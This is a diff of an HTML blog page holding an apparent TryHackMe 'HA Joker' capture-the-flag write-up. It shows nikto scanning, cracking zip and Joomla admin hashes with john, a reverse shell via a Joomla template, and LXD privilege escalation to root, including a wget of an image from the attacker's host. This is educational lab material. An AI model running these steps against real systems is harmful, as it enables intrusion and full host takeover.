-+ Entry <span class="s1">&#39;/administrator/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/bin/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/cache/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/cli/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/components/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/includes/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/language/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/layouts/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/libraries/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/modules/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/plugins/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ Entry <span class="s1">&#39;/tmp/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
-+ <span class="s2">&#34;robots.txt&#34;</span> contains <span class="m">14</span> entries which should be manually viewed.
-+ Apache/2.4.29 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span>. Apache 2.2.34 is the EOL <span class="k">for</span> the 2.x branch.
-+ /backup.zip: Potentially interesting archive/cert file found.
-. . .
-
-<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>:8080/backup.zip
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nikto -h http://<span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>:8080 -id joker:hannah
+</span></span><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          10.10.15.48
+</span></span><span class="line"><span class="cl">+ Target Hostname:    10.10.15.48
+</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">8080</span>
+</span></span><span class="line"><span class="cl">+ Start Time:         2021-01-06 02:05:41 <span class="o">(</span>GMT-6<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ The anti-clickjacking X-Frame-Options header is not present.
+</span></span><span class="line"><span class="cl">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+</span></span><span class="line"><span class="cl">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>
+</span></span><span class="line"><span class="cl">+ / - Requires Authentication <span class="k">for</span> realm <span class="s1">&#39; Please enter the password.&#39;</span>
+</span></span><span class="line"><span class="cl">+ Successfully authenticated to realm <span class="s1">&#39; Please enter the password.&#39;</span> with user-supplied credentials.
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/administrator/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/bin/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/cache/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/cli/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/components/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/includes/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/language/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/layouts/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/libraries/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/modules/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/plugins/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Entry <span class="s1">&#39;/tmp/&#39;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ <span class="s2">&#34;robots.txt&#34;</span> contains <span class="m">14</span> entries which should be manually viewed.
+</span></span><span class="line"><span class="cl">+ Apache/2.4.29 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span>. Apache 2.2.34 is the EOL <span class="k">for</span> the 2.x branch.
+</span></span><span class="line"><span class="cl">+ /backup.zip: Potentially interesting archive/cert file found.
+</span></span><span class="line"><span class="cl">. . .
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">{</span>TARGET MACHINE IP<span class="o">}</span>:8080/backup.zip
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>We have the backup file and now we should look for some information, for example database, configuration files, etc &hellip;<br />
 But the backup file seems to be encrypted.<br />
 <strong>What is the password?</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2214,18 +2214,18 @@ But the backup file seems to be encrypted.<br />
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">zip2john backup.zip &gt; zipHash
-
-john zipHash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt 
-Using default input encoding: UTF-8
-Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
-Will run <span class="m">2</span> OpenMP threads
-Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
-hannah           <span class="o">(</span>backup.zip<span class="o">)</span>
-1g 0:00:00:00 DONE <span class="o">(</span>2021-01-06 02:10<span class="o">)</span> 11.11g/s 45511p/s 45511c/s 45511C/s 123456..oooooo
-Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
-Session completed
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">zip2john backup.zip &gt; zipHash
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">john zipHash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt 
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">hannah           <span class="o">(</span>backup.zip<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2021-01-06 02:10<span class="o">)</span> 11.11g/s 45511p/s 45511c/s 45511C/s 123456..oooooo
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Remember that&hellip; We need access to the administration of the site&hellip;<br />
 In our new discovery we see some files that have compromising information, maybe db?<br />
@@ -2234,11 +2234,11 @@ Some tables must have something like user_table!<br />
 <strong>What is the super duper user?</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">unzip backup.zip
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">unzip backup.zip
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Enter password obtained from the previos question.<br />
 Two directiories were extracted: db, site<br />
@@ -2259,7 +2259,7 @@ db directory contains <strong>joomladb.sql</strong></p>
 <p>Copy found hash value into a new text file.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2271,17 +2271,17 @@ db directory contains <strong>joomladb.sql</strong></p>
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">john adminHash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
-Using default input encoding: UTF-8
-Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
-Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1024</span> <span class="k">for</span> all loaded hashes
-Will run <span class="m">2</span> OpenMP threads
-Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
-abcd1234         <span class="o">(</span>?<span class="o">)</span>
-1g 0:00:00:19 DONE <span class="o">(</span>2021-01-06 02:54<span class="o">)</span> 0.05205g/s 53.40p/s 53.40c/s 53.40C/s bullshit..bulldogs
-Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
-Session completed
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john adminHash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">1024</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">2</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">abcd1234         <span class="o">(</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:19 DONE <span class="o">(</span>2021-01-06 02:54<span class="o">)</span> 0.05205g/s 53.40p/s 53.40c/s 53.40C/s bullshit..bulldogs
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>At this point, you should be upload a reverse-shell in order to gain shell access.<br />
 <strong>What is the owner of this session?</strong></p>
@@ -2291,35 +2291,35 @@ Here I found an article with two ways how to exploit Joomla tempates: <br />
 After succesfull exploitation we are in.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">whoami
-www-data
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">www-data
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>This user belongs to a group that differs on your own group, What is this group?</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">id
-<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>,115<span class="o">(</span>lxd<span class="o">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>,115<span class="o">(</span>lxd<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>Spawn a tty shell.</strong></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">$ python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;);&#39;</span>
-www-data@ubuntu:/$ 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;);&#39;</span>
+</span></span><span class="line"><span class="cl">www-data@ubuntu:/$ 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="privilege-escalation">Privilege Escalation</h3>
 <h4 id="lxd">LXD</h4>
@@ -2330,29 +2330,29 @@ Create the container with the privilege true and mount the root file system on /
 <p>Local machine:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">git clone https://github.com/saghul/lxd-alpine-builder.git
-<span class="nb">cd</span> lxd-alpine-builder
-./build-alpine
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/saghul/lxd-alpine-builder.git
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> lxd-alpine-builder
+</span></span><span class="line"><span class="cl">./build-alpine
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Start a simple http python server and download tar archive on the target machine.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python3 -m http.server <span class="m">80</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -m http.server <span class="m">80</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Target machine:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2372,25 +2372,25 @@ Create the container with the privilege true and mount the root file system on /
 </span><span class="lnt">18
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /tmp
-wget http://10.9.140.180:80/alpine-v3.12-x86_64-20210106_0325.tar.gz
-
-lxc image import ./alpine-v3.12-x86_64-20210106_0325.tar.gz --alias myimage
-lxc init myimage ignite -c security.privileged<span class="o">=</span><span class="nb">true</span>
-lxc config device add ignite mydevice disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
-lxc start ignite
-lxc <span class="nb">exec</span> ignite /bin/sh
-
-~ <span class="c1"># id      </span>
-id
-<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-
-~ <span class="c1"># cd /mnt/root/root</span>
-<span class="nb">cd</span> /mnt/root/root
-
-~ <span class="c1">#  ls</span>
-final.txt
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> /tmp
+</span></span><span class="line"><span class="cl">wget http://10.9.140.180:80/alpine-v3.12-x86_64-20210106_0325.tar.gz
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lxc image import ./alpine-v3.12-x86_64-20210106_0325.tar.gz --alias myimage
+</span></span><span class="line"><span class="cl">lxc init myimage ignite -c security.privileged<span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">lxc config device add ignite mydevice disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">lxc start ignite
+</span></span><span class="line"><span class="cl">lxc <span class="nb">exec</span> ignite /bin/sh
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">~ <span class="c1"># id      </span>
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">~ <span class="c1"># cd /mnt/root/root</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /mnt/root/root
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">~ <span class="c1">#  ls</span>
+</span></span><span class="line"><span class="cl">final.txt
+</span></span></code></pre></td></tr></table>
 </div>
 </div>
     </article>
@@ -2582,29 +2582,6 @@ final.txt
   
 </script>
     
-<div class="donation">
-  <div class="donation__message">
-    Share on
-  </div>
-  <div class="donation__icons">
-    
-    
-    
-      
-        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fha-joker-ctf%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
-        </a>
-      
-    
-      
-        <a href="https://twitter.com/intent/tweet?text=HA%20Joker%20CTF%20%5bTryHackMe%5d&url=https%3a%2f%2fmartinkubecka.github.io%2fposts%2fthm%2fha-joker-ctf%2f&hashtags=enumeration%2chash%20cracking%2clxd&via=" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
-          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
-        </a>
-      
-    
-  </div>
-</div>
-
 
     
     
@@ -2630,7 +2607,7 @@ final.txt
     </div>
     <div class="whoami__desc">
       
-        Computer Science student interested in Penetration Testing, Cyber Defense, OSINT and Social Engineering
+        Cyber Security Analyst | Master&#39;s student of Computer Science
       
     </div>
     <div class="whoami__social">
@@ -2817,7 +2794,7 @@ final.txt
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.9d61b979db5cc2a1ff3a5d410e881547a61b9d28bc23e811c49061d47df07ef3.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3838,7 +3815,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 
             <p class="caption">
                 
-                    ©2022, All Rights Reserved
+                    ©2023, All Rights Reserved
                 
             </p>
         
